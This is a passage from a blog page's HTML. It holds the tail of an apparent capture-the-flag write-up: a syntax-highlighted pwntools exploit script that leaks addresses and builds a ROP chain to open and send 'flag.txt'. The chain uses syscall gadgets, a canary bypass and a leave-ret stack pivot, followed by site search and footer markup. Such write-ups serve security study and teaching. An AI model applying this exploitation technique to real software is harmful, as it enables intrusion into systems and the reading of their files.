</span><span>    </span><span style="color:#b48ead;">return </span><span>s
</span><span>
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">send_address</span><span>(</span><span style="color:#bf616a;">addr</span><span>):
</span><span>    io.</span><span style="color:#bf616a;">sendline</span><span>(&quot;</span><span style="color:#d08770;">{}</span><span>&quot;.</span><span style="color:#bf616a;">format</span><span>(</span><span style="color:#bf616a;">pack_input</span><span>(addr)))
</span><span>
</span><span style="color:#96b5b4;">print</span><span>(&quot;</span><span style="color:#a3be8c;">Addr: scanf(</span><span style="color:#d08770;">{}</span><span style="color:#a3be8c;">) buffer(</span><span style="color:#d08770;">{}</span><span style="color:#a3be8c;">)</span><span>&quot;.</span><span style="color:#bf616a;">format</span><span>(</span><span style="color:#96b5b4;">hex</span><span>(scanf_leak), </span><span style="color:#96b5b4;">hex</span><span>(buffer_leak)))
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">overflow</span><span>(</span><span style="color:#bf616a;">r</span><span>):
</span><span>    </span><span style="color:#bf616a;">send_address</span><span>(</span><span style="color:#d08770;">0x007478742e67616c66</span><span>)
</span><span>    </span><span style="color:#bf616a;">send_address</span><span>(</span><span style="color:#d08770;">0x00</span><span>)
</span><span>
</span><span>    </span><span style="color:#65737e;"># Open
</span><span>    </span><span style="color:#bf616a;">send_address</span><span>(pop_rdi)
</span><span>    </span><span style="color:#bf616a;">send_address</span><span>(buffer_leak)
</span><span>    </span><span style="color:#bf616a;">send_address</span><span>(pop_rsi)
</span><span>    </span><span style="color:#bf616a;">send_address</span><span>(</span><span style="color:#d08770;">0x0</span><span>)
</span><span>    </span><span style="color:#bf616a;">send_address</span><span>(pop_rax)
</span><span>    </span><span style="color:#bf616a;">send_address</span><span>(</span><span style="color:#d08770;">0x2</span><span>)
</span><span>    </span><span style="color:#bf616a;">send_address</span><span>(syscall)
</span><span>
</span><span>    </span><span style="color:#65737e;"># sendfile
</span><span>    </span><span style="color:#bf616a;">send_address</span><span>(libc.address + </span><span style="color:#d08770;">0x000000000003d1ee</span><span>)
</span><span>    </span><span style="color:#bf616a;">send_address</span><span>(</span><span style="color:#d08770;">0x200</span><span>)
</span><span>    </span><span style="color:#bf616a;">send_address</span><span>(pop_rsi)
</span><span>    </span><span style="color:#bf616a;">send_address</span><span>(</span><span style="color:#d08770;">0x3</span><span>)
</span><span>    </span><span style="color:#bf616a;">send_address</span><span>(pop_rdi)
</span><span>    </span><span style="color:#bf616a;">send_address</span><span>(</span><span style="color:#d08770;">1</span><span>)
</span><span>    </span><span style="color:#bf616a;">send_address</span><span>(libc.address + </span><span style="color:#d08770;">0x0000000000119170</span><span>)
</span><span>
</span><span>    </span><span style="color:#bf616a;">send_address</span><span>(libc.sym.read)
</span><span>
</span><span>    </span><span style="color:#bf616a;">send_address</span><span>(libc.sym.write)
</span><span>    </span><span style="color:#bf616a;">send_address</span><span>(pop_rdi)
</span><span>
</span><span>    </span><span style="color:#65737e;"># Bypass the canary
</span><span>    io.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">.</span><span>&quot;)
</span><span>    io.</span><span style="color:#bf616a;">sendline</span><span>(&quot;</span><span style="color:#d08770;">{}</span><span>&quot;.</span><span style="color:#bf616a;">format</span><span>(</span><span style="color:#bf616a;">pack_input</span><span>(buffer_leak + </span><span style="color:#d08770;">8</span><span>)))
</span><span>
</span><span>
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">first_stage</span><span>():
</span><span>    </span><span style="color:#bf616a;">overflow</span><span>(</span><span style="color:#d08770;">0</span><span>);
</span><span>    io.</span><span style="color:#bf616a;">sendline</span><span>(&quot;</span><span style="color:#d08770;">{}</span><span>&quot;.</span><span style="color:#bf616a;">format</span><span>(</span><span style="color:#bf616a;">pack_input</span><span>(leave_ret)))
</span><span>
</span><span style="color:#bf616a;">first_stage</span><span>()
</span><span>io.</span><span style="color:#bf616a;">interactive</span><span>()
</span></code></pre>

          </div>
        </article>
      </div>
      
    </div>
  </div>
</section>


  
  <section class="modal" id="search-modal">
    <div class="modal-background"></div>
    <div class="modal-card">
      <header class="modal-card-head">
        <p class="modal-card-title">Search</p>
      </header>
      <section class="modal-card-body">
        <div class="field mb-2">
          <div class="control">
            <input class="input" id="search" placeholder="Search this website." type="search" />
          </div>
        </div>
        <div class="search-results">
          <div class="search-results__items"></div>
        </div>
      </section>
    </div>
    <button aria-label="close" class="modal-close is-large"></button>
  </section>
  


  



  



  
  <footer class="footer py-4">
    <div class="content has-text-centered">
      <p>
        Built with
        <span class="icon-text">
          <span class="icon">
            <i class="fas fa-code"></i>
          </span>
          <span>code</span>
        </span>
        and
        <span class="icon-text">
          <span class="icon">
            <i class="fas fa-heart"></i>
          </span>
          <span>love</span>
        </span>
      </p>
      <p>
        Powered by
        <span class="icon-text">
          <span class="icon">
            <i class="fas fa-power-off"></i>
          </span>
          <span>zola</span>
        </span>
      </p>
    </div>
  </footer>
  

  
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/galleria@1.6.1/dist/galleria.min.js" integrity="sha384-QSfwGT8/EU536DKdtyP2D6SLlh8zBaZ0cVkwfrwhqzIU9VCfJT00CLVP5t+HAiYg" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/galleria@1.6.1/dist/themes/folio/galleria.folio.min.js" integrity="sha384-DwpKI+deZB267+hPKwiOIc5Y2GKsVL0mR6hgz7GgIu7AgAMYqJwcJKY1YBNfhWcY" crossorigin="anonymous"></script>
  
  
  <script src="https://cdn.jsdelivr.net/npm/mermaid@8.13.5/dist/mermaid.min.js" integrity="sha384-0yWn54pSGtfKCU+skfA69l25VsCw+MZt4LQov3xNRoS7YkAMrFokGgSBnAWSK4pv" crossorigin="anonymous"></script>
  
  
  <script src="https://cdn.jsdelivr.net/npm/chart.xkcd@1.1.13/dist/chart.xkcd.min.js" integrity="sha384-xC3h1+IHXK8seA+8KfT79Z4e0GPsznjXBoMa5nd8ooWKplPyXx92NOmljWxLC/cs" crossorigin="anonymous"></script>
  
  
  <script src="https://movabs.github.io/elasticlunr.min.js"></script>
  <script src="https://movabs.github.io/search_index.en.js"></script><script src="https://movabs.github.io/js/site.js"></script>

  





  
  
</body>

</html>
